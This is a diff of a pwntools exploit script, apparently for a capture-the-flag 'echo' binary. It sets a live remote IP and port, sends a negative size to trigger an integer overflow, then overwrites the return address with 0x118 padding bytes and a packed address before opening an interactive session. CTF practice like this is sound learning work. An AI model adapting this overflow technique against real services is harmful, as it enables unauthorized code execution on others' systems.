@@ -7,8 +7,8 @@ exe = ELF("./echo_patched")
 context.log_level = 'info'
 context.binary = exe
 context.terminal = ['tmux', 'splitw', '-h']
-host = 'addr'
-port = 1337
+host = '34.170.146.252'
+port = 15774
 
 gdbscript = '''
 break main
@@ -30,7 +30,8 @@ def conn():
 
 def main():
     r = conn()
-    r.sendline(b'12' + b'22')
+    r.sendlineafter(b"Size: ", b'-2147483648')
+    r.sendlineafter(b"Data: ", b'a' * 0x118 + pack(0x04011f6))
     r.interactive()
 
 
